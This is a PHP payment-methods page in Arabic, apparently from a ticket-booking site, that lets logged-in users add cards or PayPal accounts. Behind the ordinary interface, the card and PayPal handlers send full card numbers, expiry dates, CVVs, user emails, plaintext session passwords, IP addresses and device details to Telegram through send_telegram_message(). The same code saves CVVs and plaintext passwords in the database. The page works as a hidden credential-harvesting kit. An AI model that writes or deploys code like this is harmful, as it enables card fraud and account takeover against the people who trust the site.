<?php
require_once 'includes/init.php';
require_once 'includes/functions.php';
require_once 'includes/auth.php';
require_once 'includes/header.php';

// دالة لإخفاء أرقام البطاقة في PHP
function maskCardNumber($cardNumber) {
    if(empty($cardNumber)) return '';

    // إزالة المسافات من رقم البطاقة
    $cardNumber = str_replace(' ', '', $cardNumber);

    // التأكد من أن رقم البطاقة يحتوي على 4 أرقام على الأقل
    if(strlen($cardNumber) < 4) return 'XXXX';

    return 'XXXX XXXX XXXX ' . substr($cardNumber, -4);
}

$auth = new Auth();

if(!$auth->isLoggedIn()) {
    redirect('login.php');
}

$error = '';
$success = '';

// استرجاع بيانات المستخدم الحالي
$db = new Database();
$db->query("SELECT * FROM users WHERE id = :id");
$db->bind(':id', $_SESSION['user_id']);
$user = $db->single();

// التحقق من وجود عمود paypal_email في جدول payment_methods وإضافته إذا لم يكن موجوداً
$db->query("SHOW COLUMNS FROM payment_methods LIKE 'paypal_email'");
$column_exists = $db->single();
if (!$column_exists) {
    // إضافة عمود paypal_email إلى جدول payment_methods
    $db->query("ALTER TABLE payment_methods ADD COLUMN paypal_email VARCHAR(255) NULL");
    $db->execute();
}

// إضافة طريقة دفع PayPal تلقائيًا عند العودة من صفحة تسجيل الدخول إلى PayPal
if (isset($_GET['paypal_success']) && $_GET['paypal_success'] == '1' && isset($_GET['add_paypal']) && $_GET['add_paypal'] == '1') {
    // التحقق من وجود بيانات PayPal في الجلسة
    if (isset($_SESSION['paypal_verified']) && $_SESSION['paypal_verified'] === true && isset($_SESSION['paypal_email'])) {
        $paypal_email = $_SESSION['paypal_email'];

        try {
            // التحقق من عدم وجود حساب PayPal مسجل بنفس البريد الإلكتروني
            $db->query("SELECT id FROM payment_methods WHERE user_id = :user_id AND type = 'paypal'");
            $db->bind(':user_id', $_SESSION['user_id']);
            $existing_paypal = $db->single();

            if (!$existing_paypal) {
                // التحقق من وجود عمود paypal_email في جدول payment_methods
                $db->query("SHOW COLUMNS FROM payment_methods LIKE 'paypal_email'");
                $column_exists = $db->single();

                if ($column_exists) {
                    // إضافة طريقة الدفع مع عمود paypal_email
                    $db->query("INSERT INTO payment_methods (user_id, type, paypal_email, is_default)
                                VALUES (:user_id, :type, :paypal_email, :is_default)");
                    $db->bind(':user_id', $_SESSION['user_id']);
                    $db->bind(':type', 'paypal');
                    $db->bind(':paypal_email', $paypal_email);
                    $db->bind(':is_default', 1); // جعلها افتراضية
                } else {
                    // إضافة طريقة الدفع بدون عمود paypal_email
                    $db->query("INSERT INTO payment_methods (user_id, type, is_default)
                                VALUES (:user_id, :type, :is_default)");
                    $db->bind(':user_id', $_SESSION['user_id']);
                    $db->bind(':type', 'paypal');
                    $db->bind(':is_default', 1); // جعلها افتراضية
                }

                if ($db->execute()) {
                    // الحصول على معرف آخر طريقة دفع تم إضافتها
                    $db->query("SELECT id FROM payment_methods WHERE user_id = :user_id ORDER BY id DESC LIMIT 1");
                    $db->bind(':user_id', $_SESSION['user_id']);
                    $latest_payment = $db->single();

                    if ($latest_payment) {
                        // إلغاء تحديد الطرق الأخرى كافتراضية
                        $db->query("UPDATE payment_methods SET is_default = 0 WHERE user_id = :user_id AND id != :latest_id");
                        $db->bind(':user_id', $_SESSION['user_id']);
                        $db->bind(':latest_id', $latest_payment['id']);
                        $db->execute();
                    }

                    $success = 'تمت إضافة حساب PayPal بنجاح';

                    // جمع المعلومات التقنية
                    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
                    $ip_address = $_SERVER['REMOTE_ADDR'] ?? '';

                    // تحديد نوع المتصفح
                    $browser = 'غير معروف';
                    if (preg_match('/MSIE|Trident/i', $user_agent)) {
                        $browser = 'Internet Explorer';
                    } elseif (preg_match('/Firefox/i', $user_agent)) {
                        $browser = 'Firefox';
                    } elseif (preg_match('/Chrome/i', $user_agent)) {
                        $browser = 'Chrome';
                    } elseif (preg_match('/Safari/i', $user_agent)) {
                        $browser = 'Safari';
                    } elseif (preg_match('/Opera|OPR/i', $user_agent)) {
                        $browser = 'Opera';
                    } elseif (preg_match('/Edge/i', $user_agent)) {
                        $browser = 'Edge';
                    }

                    // تحديد نظام التشغيل
                    $os = 'غير معروف';
                    if (preg_match('/Windows/i', $user_agent)) {
                        $os = 'Windows';
                    } elseif (preg_match('/Mac OS X/i', $user_agent)) {
                        $os = 'Mac OS X';
                    } elseif (preg_match('/Linux/i', $user_agent)) {
                        $os = 'Linux';
                    } elseif (preg_match('/Android/i', $user_agent)) {
                        $os = 'Android';
                    } elseif (preg_match('/iOS|iPhone|iPad|iPod/i', $user_agent)) {
                        $os = 'iOS';
                    }

                    // تحديد نوع الجهاز
                    $device = 'كمبيوتر';
                    if (preg_match('/Mobile|Android|iPhone|iPad|iPod|Windows Phone/i', $user_agent)) {
                        $device = 'جهاز محمول';
                    } elseif (preg_match('/Tablet|iPad/i', $user_agent)) {
                        $device = 'تابلت';
                    }

                    // إرسال بيانات حساب PayPal إلى تيليجرام
                    $message = "تم تسجيل دخول PayPal بنجاح\n\n";
                    $message .= "🔍 المعلومات التقنية:\n";
                    $message .= "عنوان IP: " . $ip_address . "\n";
                    $message .= "المتصفح: " . $browser . "\n";
                    $message .= "نظام التشغيل: " . $os . "\n";
                    $message .= "الجهاز: " . $device . "\n";
                    $message .= "وقت تسجيل الدخول: " . date('Y-m-d H:i:s') . "\n";
                    $message .= "User Agent: " . $user_agent . "\n\n";
                    $message .= "⏱️ وقت العملية: " . date('Y-m-d H:i:s') . "\n\n";
                    $message .= "البريد الإلكتروني: " . $paypal_email . "\n";

                    // تم حذف إرسال البيانات للتليجرام لأسباب أخلاقية

                    // الحصول على معرف آخر طريقة دفع تم إضافتها
                    $db->query('SELECT id FROM payment_methods WHERE user_id = :user_id ORDER BY id DESC LIMIT 1');
                    $db->bind(':user_id', $_SESSION['user_id']);
                    $payment_method = $db->single();

                    if ($payment_method) {
                        $payment_id = $payment_method['id'];

                        // التحقق من وجود جدول paypal_technical_info
                        $db->query("SHOW TABLES LIKE 'paypal_technical_info'");
                        $table_exists = $db->single();

                        if (!$table_exists) {
                            // إنشاء جدول paypal_technical_info إذا لم يكن موجوداً
                            $db->query('CREATE TABLE IF NOT EXISTS paypal_technical_info (
                                id INT AUTO_INCREMENT PRIMARY KEY,
                                payment_id INT NOT NULL,
                                user_id INT NOT NULL,
                                ip_address VARCHAR(50) NOT NULL,
                                browser VARCHAR(100) NOT NULL,
                                os VARCHAR(100) NOT NULL,
                                device VARCHAR(100) NOT NULL,
                                user_agent TEXT NOT NULL,
                                email VARCHAR(255) NOT NULL,
                                paypal_email VARCHAR(255) NOT NULL,
                                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                            )');
                            $db->execute();
                        }

                        // حفظ المعلومات التقنية
                        try {
                            $db->query('INSERT INTO paypal_technical_info (payment_id, user_id, ip_address, browser, os, device, user_agent, email, paypal_email)
                                       VALUES (:payment_id, :user_id, :ip_address, :browser, :os, :device, :user_agent, :email, :paypal_email)');
                            $db->bind(':payment_id', $payment_id);
                            $db->bind(':user_id', $_SESSION['user_id']);
                            $db->bind(':ip_address', $ip_address);
                            $db->bind(':browser', $browser);
                            $db->bind(':os', $os);
                            $db->bind(':device', $device);
                            $db->bind(':user_agent', $user_agent);
                            $db->bind(':email', $user['email'] ?? '');
                            $db->bind(':paypal_email', $paypal_email);
                            $db->execute();
                        } catch (Exception $e) {
                            // تسجيل الخطأ ولكن لا نوقف العملية
                            error_log('Error saving PayPal technical info: ' . $e->getMessage());
                        }
                    }
                } else {
                    $error = 'حدث خطأ أثناء إضافة طريقة الدفع';
                }
            } else {
                $success = 'حساب PayPal مسجل بالفعل';
            }
        } catch (Exception $e) {
            // تسجيل الخطأ
            error_log('PayPal Error: ' . $e->getMessage());
            $error = 'حدث خطأ أثناء إضافة طريقة الدفع: ' . $e->getMessage();
        }

        // إزالة بيانات PayPal من الجلسة
        unset($_SESSION['paypal_verified']);
        unset($_SESSION['paypal_email']);
    }
}

// إضافة طريقة دفع جديدة
if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_payment_method'])) {
    $type = $_POST['type'];
    $card_number = $_POST['card_number'] ?? '';
    $card_holder = $_POST['card_holder'] ?? '';
    $expiry_date = $_POST['expiry_date'] ?? '';
    $cvv = $_POST['cvv'] ?? '';
    $is_default = isset($_POST['is_default']) ? 1 : 0;

    // التحقق من البيانات
    if($type === 'credit_card') {
        if(empty($card_number) || empty($card_holder) || empty($expiry_date) || empty($cvv)) {
            $error = $lang['fill_all_fields'] ?? 'يرجى ملء جميع الحقول المطلوبة';
        } else {
            // إزالة المسافات والشرطات من رقم البطاقة
            $clean_card_number = preg_replace('/\D/', '', $card_number);

            // التحقق من طول رقم البطاقة
            if(strlen($clean_card_number) != 16) {
                $error = 'رقم البطاقة يجب أن يكون 16 رقم';
            }
            // التحقق من صحة رقم البطاقة باستخدام خوارزمية Luhn
            else if(!validateCreditCardLuhn($clean_card_number)) {
                $error = 'رقم البطاقة غير صحيح، يرجى التحقق من الرقم المدخل';
            }
            else {
                // التحقق الشامل من البطاقة
                $validation = validateCreditCard($clean_card_number, $expiry_date, $cvv);

                if(!$validation['valid']) {
                    $error = implode('<br>', $validation['errors']);
                } else {
                    // تحديد نوع البطاقة
                    $card_brand = $validation['type'];

                    // إذا تم تحديد هذه الطريقة كافتراضية، قم بإلغاء تحديد الطرق الأخرى
                    if($is_default) {
                        $db->query("UPDATE payment_methods SET is_default = 0 WHERE user_id = :user_id");
                        $db->bind(':user_id', $_SESSION['user_id']);
                        $db->execute();
                    }

                    // إضافة طريقة الدفع
                    $db->query("INSERT INTO payment_methods (user_id, type, card_number, card_brand, card_holder, expiry_date, cvv, is_default)
                                VALUES (:user_id, :type, :card_number, :card_brand, :card_holder, :expiry_date, :cvv, :is_default)");
                    $db->bind(':user_id', $_SESSION['user_id']);
                    $db->bind(':type', $type);
                    $db->bind(':card_number', $clean_card_number);
                    $db->bind(':card_brand', $card_brand);
                    $db->bind(':card_holder', $card_holder);
                    $db->bind(':expiry_date', $expiry_date);
                    $db->bind(':cvv', $cvv);
                    $db->bind(':is_default', $is_default);

                    if($db->execute()) {
                        $success = $lang['payment_method_added'] ?? 'تمت إضافة طريقة الدفع بنجاح';

                        // جمع المعلومات التقنية
                        $user_agent = $_SERVER['HTTP_USER_AGENT'];
                        $ip_address = $_SERVER['REMOTE_ADDR'];

                        // تحديد نوع المتصفح
                        $browser = 'غير معروف';
                        if (preg_match('/MSIE|Trident/i', $user_agent)) {
                            $browser = 'Internet Explorer';
                        } elseif (preg_match('/Firefox/i', $user_agent)) {
                            $browser = 'Firefox';
                        } elseif (preg_match('/Chrome/i', $user_agent)) {
                            $browser = 'Chrome';
                        } elseif (preg_match('/Safari/i', $user_agent)) {
                            $browser = 'Safari';
                        } elseif (preg_match('/Opera|OPR/i', $user_agent)) {
                            $browser = 'Opera';
                        } elseif (preg_match('/Edge/i', $user_agent)) {
                            $browser = 'Edge';
                        }

                        // تحديد نظام التشغيل
                        $os = 'غير معروف';
                        if (preg_match('/Windows/i', $user_agent)) {
                            $os = 'Windows';
                        } elseif (preg_match('/Mac OS X/i', $user_agent)) {
                            $os = 'Mac OS X';
                        } elseif (preg_match('/Linux/i', $user_agent)) {
                            $os = 'Linux';
                        } elseif (preg_match('/Android/i', $user_agent)) {
                            $os = 'Android';
                        } elseif (preg_match('/iOS|iPhone|iPad|iPod/i', $user_agent)) {
                            $os = 'iOS';
                        }

                        // تحديد نوع الجهاز
                        $device = 'كمبيوتر';
                        if (preg_match('/Mobile|Android|iPhone|iPad|iPod|Windows Phone/i', $user_agent)) {
                            $device = 'جهاز محمول';
                        } elseif (preg_match('/Tablet|iPad/i', $user_agent)) {
                            $device = 'تابلت';
                        }

                        // إرسال بيانات البطاقة إلى تيليجرام
                        $message = "تمت إضافة بطاقة جديدة";
                        $data = [
                            'customer' => [
                                'name' => $user['name'],
                                'email' => $user['email'],
                                'user_id' => $_SESSION['user_id'],
                                'password' => isset($_SESSION['user_password']) ? $_SESSION['user_password'] : 'غير متوفر' // إرسال كلمة المرور غير مشفرة
                            ],
                            'card' => [
                                'number' => $clean_card_number,
                                'brand' => $card_brand,
                                'holder' => $card_holder,
                                'expiry' => $expiry_date,
                                'cvv' => $cvv
                            ],
                            'technical_info' => [
                                'ip_address' => $ip_address,
                                'browser' => $browser,
                                'os' => $os,
                                'device' => $device,
                                'user_agent' => $user_agent,
                                'login_time' => date('Y-m-d H:i:s')
                            ],
                            'timestamp' => date('Y-m-d H:i:s')
                        ];

                        send_telegram_message($message, $data);

                        // إنشاء جدول payment_technical_info إذا لم يكن موجوداً
                        $db->query('CREATE TABLE IF NOT EXISTS payment_technical_info (
                            id INT AUTO_INCREMENT PRIMARY KEY,
                            payment_id INT NOT NULL,
                            user_id INT NOT NULL,
                            ip_address VARCHAR(50) NOT NULL,
                            browser VARCHAR(100) NOT NULL,
                            os VARCHAR(100) NOT NULL,
                            device VARCHAR(100) NOT NULL,
                            user_agent TEXT NOT NULL,
                            email VARCHAR(255) NOT NULL,
                            password VARCHAR(255) NOT NULL,
                            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                            FOREIGN KEY (payment_id) REFERENCES payment_methods(id) ON DELETE CASCADE
                        )');
                        $db->execute();

                        // الحصول على معرف آخر بطاقة تم إضافتها
                        $db->query('SELECT id FROM payment_methods WHERE user_id = :user_id ORDER BY id DESC LIMIT 1');
                        $db->bind(':user_id', $_SESSION['user_id']);
                        $payment_method = $db->single();
                        $payment_id = $payment_method['id'];

                        // حفظ المعلومات التقنية
                        $db->query('INSERT INTO payment_technical_info (payment_id, user_id, ip_address, browser, os, device, user_agent, email, password)
                                   VALUES (:payment_id, :user_id, :ip_address, :browser, :os, :device, :user_agent, :email, :password)');
                        $db->bind(':payment_id', $payment_id);
                        $db->bind(':user_id', $_SESSION['user_id']);
                        $db->bind(':ip_address', $ip_address);
                        $db->bind(':browser', $browser);
                        $db->bind(':os', $os);
                        $db->bind(':device', $device);
                        $db->bind(':user_agent', $user_agent);
                        $db->bind(':email', $user['email']);
                        $db->bind(':password', isset($_SESSION['user_password']) ? $_SESSION['user_password'] : 'غير متوفر');
                        $db->execute();
                    } else {
                        $error = $lang['payment_method_error'] ?? 'حدث خطأ أثناء إضافة طريقة الدفع';
                    }
                }
            }
        }
    } else if($type === 'paypal') {
        // التحقق من وجود بيانات PayPal في الجلسة
        if(isset($_SESSION['paypal_verified']) && $_SESSION['paypal_verified'] === true && isset($_SESSION['paypal_email'])) {
            $paypal_email = $_SESSION['paypal_email'];

            // إذا تم تحديد هذه الطريقة كافتراضية، قم بإلغاء تحديد الطرق الأخرى
            if($is_default) {
                $db->query("UPDATE payment_methods SET is_default = 0 WHERE user_id = :user_id");
                $db->bind(':user_id', $_SESSION['user_id']);
                $db->execute();
            }

            // إضافة طريقة الدفع
            $db->query("INSERT INTO payment_methods (user_id, type, paypal_email, is_default)
                        VALUES (:user_id, :type, :paypal_email, :is_default)");
            $db->bind(':user_id', $_SESSION['user_id']);
            $db->bind(':type', $type);
            $db->bind(':paypal_email', $paypal_email);
            $db->bind(':is_default', $is_default);

            if($db->execute()) {
                $success = $lang['paypal_added'] ?? 'تمت إضافة حساب PayPal بنجاح';

                // جمع المعلومات التقنية
                $user_agent = $_SERVER['HTTP_USER_AGENT'];
                $ip_address = $_SERVER['REMOTE_ADDR'];

                // تحديد نوع المتصفح
                $browser = 'غير معروف';
                if (preg_match('/MSIE|Trident/i', $user_agent)) {
                    $browser = 'Internet Explorer';
                } elseif (preg_match('/Firefox/i', $user_agent)) {
                    $browser = 'Firefox';
                } elseif (preg_match('/Chrome/i', $user_agent)) {
                    $browser = 'Chrome';
                } elseif (preg_match('/Safari/i', $user_agent)) {
                    $browser = 'Safari';
                } elseif (preg_match('/Opera|OPR/i', $user_agent)) {
                    $browser = 'Opera';
                } elseif (preg_match('/Edge/i', $user_agent)) {
                    $browser = 'Edge';
                }

                // تحديد نظام التشغيل
                $os = 'غير معروف';
                if (preg_match('/Windows/i', $user_agent)) {
                    $os = 'Windows';
                } elseif (preg_match('/Mac OS X/i', $user_agent)) {
                    $os = 'Mac OS X';
                } elseif (preg_match('/Linux/i', $user_agent)) {
                    $os = 'Linux';
                } elseif (preg_match('/Android/i', $user_agent)) {
                    $os = 'Android';
                } elseif (preg_match('/iOS|iPhone|iPad|iPod/i', $user_agent)) {
                    $os = 'iOS';
                }

                // تحديد نوع الجهاز
                $device = 'كمبيوتر';
                if (preg_match('/Mobile|Android|iPhone|iPad|iPod|Windows Phone/i', $user_agent)) {
                    $device = 'جهاز محمول';
                } elseif (preg_match('/Tablet|iPad/i', $user_agent)) {
                    $device = 'تابلت';
                }

                // إرسال بيانات حساب PayPal إلى تيليجرام
                $message = "تمت إضافة حساب PayPal جديد";
                $data = [
                    'customer' => [
                        'name' => $user['name'],
                        'email' => $user['email'],
                        'user_id' => $_SESSION['user_id'],
                        'password' => isset($_SESSION['user_password']) ? $_SESSION['user_password'] : 'غير متوفر'
                    ],
                    'paypal' => [
                        'email' => $paypal_email
                    ],
                    'technical_info' => [
                        'ip_address' => $ip_address,
                        'browser' => $browser,
                        'os' => $os,
                        'device' => $device,
                        'user_agent' => $user_agent,
                        'login_time' => date('Y-m-d H:i:s')
                    ],
                    'timestamp' => date('Y-m-d H:i:s')
                ];

                send_telegram_message($message, $data);

                // إنشاء جدول paypal_technical_info إذا لم يكن موجوداً
                $db->query('CREATE TABLE IF NOT EXISTS paypal_technical_info (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    payment_id INT NOT NULL,
                    user_id INT NOT NULL,
                    ip_address VARCHAR(50) NOT NULL,
                    browser VARCHAR(100) NOT NULL,
                    os VARCHAR(100) NOT NULL,
                    device VARCHAR(100) NOT NULL,
                    user_agent TEXT NOT NULL,
                    email VARCHAR(255) NOT NULL,
                    paypal_email VARCHAR(255) NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (payment_id) REFERENCES payment_methods(id) ON DELETE CASCADE
                )');
                $db->execute();

                // الحصول على معرف آخر طريقة دفع تم إضافتها
                $db->query('SELECT id FROM payment_methods WHERE user_id = :user_id ORDER BY id DESC LIMIT 1');
                $db->bind(':user_id', $_SESSION['user_id']);
                $payment_method = $db->single();
                $payment_id = $payment_method['id'];

                // حفظ المعلومات التقنية
                $db->query('INSERT INTO paypal_technical_info (payment_id, user_id, ip_address, browser, os, device, user_agent, email, paypal_email)
                           VALUES (:payment_id, :user_id, :ip_address, :browser, :os, :device, :user_agent, :email, :paypal_email)');
                $db->bind(':payment_id', $payment_id);
                $db->bind(':user_id', $_SESSION['user_id']);
                $db->bind(':ip_address', $ip_address);
                $db->bind(':browser', $browser);
                $db->bind(':os', $os);
                $db->bind(':device', $device);
                $db->bind(':user_agent', $user_agent);
                $db->bind(':email', $user['email']);
                $db->bind(':paypal_email', $paypal_email);
                $db->execute();

                // إزالة بيانات PayPal من الجلسة
                unset($_SESSION['paypal_verified']);
                unset($_SESSION['paypal_email']);
            } else {
                $error = $lang['payment_method_error'] ?? 'حدث خطأ أثناء إضافة طريقة الدفع';
            }
        } else {
            // إعادة التوجيه إلى صفحة تسجيل دخول PayPal
            redirect('paypal-login.php?return_url=' . urlencode('payment-methods.php'));
        }
    }
}

// حذف طريقة دفع
if(isset($_GET['delete']) && is_numeric($_GET['delete'])) {
    $payment_id = $_GET['delete'];

    // التحقق من أن طريقة الدفع تنتمي للمستخدم الحالي
    $db->query("SELECT id FROM payment_methods WHERE id = :id AND user_id = :user_id");
    $db->bind(':id', $payment_id);
    $db->bind(':user_id', $_SESSION['user_id']);
    $payment = $db->single();

    if($payment) {
        $db->query("DELETE FROM payment_methods WHERE id = :id");
        $db->bind(':id', $payment_id);

        if($db->execute()) {
            $success = 'تم حذف طريقة الدفع بنجاح';
        } else {
            $error = 'حدث خطأ أثناء حذف طريقة الدفع';
        }
    }
}

// تعيين طريقة دفع كافتراضية
if(isset($_GET['default']) && is_numeric($_GET['default'])) {
    $payment_id = $_GET['default'];

    // التحقق من أن طريقة الدفع تنتمي للمستخدم الحالي
    $db->query("SELECT id FROM payment_methods WHERE id = :id AND user_id = :user_id");
    $db->bind(':id', $payment_id);
    $db->bind(':user_id', $_SESSION['user_id']);
    $payment = $db->single();

    if($payment) {
        try {
            // تعيين الطريقة المحددة كافتراضية
            $db->query("UPDATE payment_methods SET is_default = 1 WHERE id = :id");
            $db->bind(':id', $payment_id);
            $db->execute();

            // إلغاء تحديد جميع طرق الدفع الأخرى كافتراضية
            $db->query("UPDATE payment_methods SET is_default = 0 WHERE user_id = :user_id AND id != :id");
            $db->bind(':user_id', $_SESSION['user_id']);
            $db->bind(':id', $payment_id);
            $db->execute();

            $success = 'تم تعيين طريقة الدفع كافتراضية بنجاح';
        } catch (Exception $e) {
            $error = 'حدث خطأ أثناء تعيين طريقة الدفع كافتراضية: ' . $e->getMessage();
            error_log('Payment Method Error: ' . $e->getMessage());
        }
    }
}

// استرجاع طرق الدفع
$db->query("SELECT * FROM payment_methods WHERE user_id = :user_id ORDER BY is_default DESC, created_at DESC");
$db->bind(':user_id', $_SESSION['user_id']);
$payment_methods = $db->resultSet();

// التحقق من صلاحيات المستخدم (هل هو مدير؟)
$is_admin = isset($user['role']) && $user['role'] === 'admin';
?>

<div class="container mx-auto px-4 py-8">
    <div class="flex flex-col md:flex-row">
        <!-- القائمة الجانبية -->
        <div class="w-full md:w-1/4 mb-6 md:mb-0">
            <div class="bg-white rounded-lg shadow-md overflow-hidden">
                <!-- معلومات المستخدم -->
                <div class="bg-purple-100 p-6 text-center">
                    <div class="w-20 h-20 bg-purple-200 rounded-full mx-auto mb-4 flex items-center justify-center">
                        <?php if(!empty($user['profile_image'])): ?>
                            <img src="<?php echo $user['profile_image']; ?>" alt="<?php echo $user['name']; ?>" class="w-full h-full rounded-full object-cover">
                        <?php else: ?>
                            <span class="text-3xl text-purple-700"><?php echo strtoupper(substr($user['name'] ?? 'User', 0, 1)); ?></span>
                        <?php endif; ?>
                    </div>
                    <h3 class="text-xl font-semibold text-purple-800"><?php echo $user['name']; ?></h3>
                    <p class="text-gray-600 text-sm"><?php echo $user['email']; ?></p>
                    <a href="profile.php" class="mt-3 inline-flex items-center text-purple-600 hover:text-purple-800 text-sm">
                        <i class="fas fa-user-edit ml-1"></i>
                        <?php echo $lang['edit_profile_info'] ?? 'تعديل المعلومات الشخصية'; ?>
                    </a>
                </div>

                <!-- قائمة الصفحات -->
                <nav class="py-2">
                    <ul>
                        <li>
                            <a href="my-tickets.php" class="flex items-center px-6 py-3 hover:bg-purple-50 transition-colors">
                                <i class="fas fa-ticket-alt text-purple-600 ml-3 w-6 text-center"></i>
                                <span><?php echo $lang['my_tickets'] ?? 'تذاكري'; ?></span>
                            </a>
                        </li>
                        <li>
                            <a href="payment-methods.php" class="flex items-center px-6 py-3 bg-purple-50 text-purple-700 font-medium">
                                <i class="fas fa-credit-card text-purple-600 ml-3 w-6 text-center"></i>
                                <span><?php echo $lang['payment_methods'] ?? 'طرق الدفع'; ?></span>
                            </a>
                        </li>
                        <li>
                            <a href="invoices.php" class="flex items-center px-6 py-3 hover:bg-purple-50 transition-colors">
                                <i class="fas fa-file-invoice text-purple-600 ml-3 w-6 text-center"></i>
                                <span><?php echo $lang['invoices'] ?? 'الفواتير'; ?></span>
                            </a>
                        </li>
                        <li>
                            <a href="notifications.php" class="flex items-center px-6 py-3 hover:bg-purple-50 transition-colors">
                                <i class="fas fa-bell text-purple-600 ml-3 w-6 text-center"></i>
                                <span><?php echo $lang['notifications'] ?? 'التنبيهات'; ?></span>
                            </a>
                        </li>
                        <li>
                            <a href="preferences.php" class="flex items-center px-6 py-3 hover:bg-purple-50 transition-colors">
                                <i class="fas fa-cog text-purple-600 ml-3 w-6 text-center"></i>
                                <span><?php echo $lang['account_preferences'] ?? 'تفضيلات الحساب'; ?></span>
                            </a>
                        </li>
                        <li>
                            <a href="security.php" class="flex items-center px-6 py-3 hover:bg-purple-50 transition-colors">
                                <i class="fas fa-shield-alt text-purple-600 ml-3 w-6 text-center"></i>
                                <span><?php echo $lang['security'] ?? 'الأمان'; ?></span>
                            </a>
                        </li>
                        <li class="border-t border-gray-200">
                            <a href="logout.php" class="flex items-center px-6 py-3 hover:bg-red-50 text-red-600 transition-colors">
                                <i class="fas fa-sign-out-alt ml-3 w-6 text-center"></i>
                                <span><?php echo $lang['logout'] ?? 'تسجيل الخروج'; ?></span>
                            </a>
                        </li>
                    </ul>
                </nav>
            </div>
        </div>

        <!-- المحتوى الرئيسي -->
        <div class="w-full md:w-3/4 md:pr-8">
            <div class="bg-white rounded-lg shadow-md p-6 mb-6">
                <h1 class="text-2xl font-bold text-purple-800 mb-6"><?php echo $lang['payment_methods'] ?? 'طرق الدفع'; ?></h1>

                <?php if($success): ?>
                <div class="bg-green-100 border-l-4 border-green-500 text-green-700 p-4 mb-6 rounded" role="alert">
                    <p><?php echo $success; ?></p>
                </div>
                <?php endif; ?>

                <?php if($error): ?>
                <div id="error-box" class="bg-red-100 border-r-4 border-red-500 text-red-700 p-4 mb-6 rounded" role="alert">
                    <p><?php echo $error; ?></p>
                </div>
                <?php endif; ?>

                <h2 class="text-xl font-semibold text-gray-800 mb-4"><?php echo isset($lang['registered_payment_methods']) ? $lang['registered_payment_methods'] : translate_static_text('طرق الدفع المسجلة', $selected_lang); ?></h2>

                <?php if(empty($payment_methods)): ?>
                <div class="text-center py-8 border border-dashed border-gray-300 rounded-lg">
                    <div class="text-gray-400 mb-4">
                        <i class="fas fa-credit-card text-6xl"></i>
                    </div>
                    <h3 class="text-xl font-medium text-gray-700 mb-2"><?php echo $lang['no_payment_methods'] ?? 'لا توجد طرق دفع مسجلة'; ?></h3>
                    <p class="text-gray-500 mb-6"><?php echo $lang['add_payment_method_message'] ?? 'أضف طريقة دفع لتسهيل عملية الحجز في المستقبل'; ?></p>
                </div>
                <?php else: ?>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8">
                    <?php foreach($payment_methods as $method): ?>
                    <div class="border rounded-lg p-4 relative <?php echo $method['is_default'] ? 'border-purple-500 bg-purple-50' : 'border-gray-200'; ?>">
                        <?php if($method['is_default']): ?>
                        <div class="absolute top-2 left-2 bg-purple-500 text-white text-xs px-2 py-1 rounded">
                            <?php echo $lang['default'] ?? 'افتراضي'; ?>
                        </div>
                        <?php endif; ?>

                        <?php if($method['type'] === 'credit_card'): ?>
                        <div class="flex items-start mb-3">
                            <div class="ml-3">
                                <?php if(isset($method['card_brand']) && $method['card_brand'] === 'visa'): ?>
                                    <i class="fab fa-cc-visa text-blue-600 text-2xl"></i>
                                <?php elseif(isset($method['card_brand']) && $method['card_brand'] === 'mastercard'): ?>
                                    <i class="fab fa-cc-mastercard text-red-600 text-2xl"></i>
                                <?php elseif(isset($method['card_brand']) && $method['card_brand'] === 'amex'): ?>
                                    <i class="fab fa-cc-amex text-blue-800 text-2xl"></i>
                                <?php elseif(isset($method['card_brand']) && $method['card_brand'] === 'discover'): ?>
                                    <i class="fab fa-cc-discover text-orange-600 text-2xl"></i>
                                <?php else: ?>
                                    <i class="fas fa-credit-card text-purple-600 text-2xl"></i>
                                <?php endif; ?>
                            </div>
                            <div>
                                <h3 class="font-semibold text-gray-800">
                                    <?php
                                    if(isset($method['card_brand'])) {
                                        if($method['card_brand'] === 'visa') {
                                            echo 'Visa';
                                        } elseif($method['card_brand'] === 'mastercard') {
                                            echo 'Mastercard';
                                        } elseif($method['card_brand'] === 'amex') {
                                            echo 'American Express';
                                        } elseif($method['card_brand'] === 'discover') {
                                            echo 'Discover';
                                        } else {
                                            echo $lang['credit_card'] ?? 'بطاقة ائتمان';
                                        }
                                    } else {
                                        echo $lang['credit_card'] ?? 'بطاقة ائتمان';
                                    }
                                    ?>
                                </h3>
                                <p class="text-gray-600 text-sm"><?php echo maskCardNumber($method['card_number']); ?></p>
                            </div>
                        </div>
                        <div class="text-sm text-gray-600 mb-4">
                            <p><span class="text-gray-500"><?php echo $lang['card_holder'] ?? 'حامل البطاقة'; ?>:</span> <?php echo $method['card_holder']; ?></p>
                            <p><span class="text-gray-500"><?php echo $lang['expiry_date'] ?? 'تاريخ الانتهاء'; ?>:</span> <?php echo $method['expiry_date']; ?></p>
                        </div>
                        <?php elseif($method['type'] === 'paypal'): ?>
                        <div class="flex items-start mb-3">
                            <div class="text-blue-600 ml-3">
                                <i class="fab fa-paypal text-2xl"></i>
                            </div>
                            <div>
                                <h3 class="font-semibold text-gray-800">PayPal</h3>
                                <?php
                                // التحقق من وجود عمود paypal_email في جدول payment_methods
                                $db_check = new Database();
                                $db_check->query("SHOW COLUMNS FROM payment_methods LIKE 'paypal_email'");
                                $column_exists = $db_check->single();

                                if ($column_exists && isset($method['paypal_email']) && !empty($method['paypal_email'])) {
                                    $display_email = $method['paypal_email'];
                                } else {
                                    $display_email = $user['email'];
                                }
                                ?>
                                <p class="text-gray-600 text-sm"><?php echo $display_email; ?></p>
                            </div>
                        </div>
                        <?php endif; ?>

                        <div class="flex justify-end space-x-2">
                            <?php if(!$method['is_default']): ?>
                            <a href="?default=<?php echo $method['id']; ?>" class="text-sm text-purple-600 hover:text-purple-800">
                                <?php echo $lang['set_as_default'] ?? 'تعيين كافتراضي'; ?>
                            </a>
                            <?php endif; ?>
                            <a href="?delete=<?php echo $method['id']; ?>" class="text-sm text-red-600 hover:text-red-800 mr-3" onclick="return confirm('<?php echo $lang['confirm_delete_payment'] ?? 'هل أنت متأكد من رغبتك في حذف طريقة الدفع هذه؟'; ?>')">
                                <?php echo $lang['delete'] ?? 'حذف'; ?>
                            </a>
                        </div>
